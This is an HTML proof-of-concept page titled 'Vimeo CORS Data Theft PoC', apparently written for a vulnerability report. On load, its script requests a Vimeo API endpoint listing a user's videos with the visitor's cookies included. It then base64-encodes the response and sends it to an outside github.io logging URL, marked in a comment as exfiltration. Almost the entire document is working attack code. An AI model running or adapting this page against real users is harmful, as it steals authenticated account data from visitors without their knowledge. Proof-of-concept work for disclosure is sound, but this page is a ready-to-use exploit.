<!DOCTYPE html>
<html>
<head>
  <title>Vimeo CORS Data Theft PoC</title>
</head>
<body>
<h1>Data Theft PoC</h1>
<pre id="output"></pre>

<script>
(async () => {
  try {
    // Replace with your own user ID
    const userId = "245175900";  

    const resp = await fetch(`https://api.vimeo.com/users/${userId}/videos`, {
      credentials: "include"  // sends Vimeo cookies
    });

    const text = await resp.text();

    // Show it on the page for proof
    document.getElementById("output").innerText = text;

    // Exfiltrate to your server/logging endpoint
    await fetch("https://russianyandexshop.github.io/view/log?d=" + encodeURIComponent(btoa(text)));

  } catch (e) {
    document.getElementById("output").innerText = "Error: " + e;
  }
})();
</script>
</body>
</html>
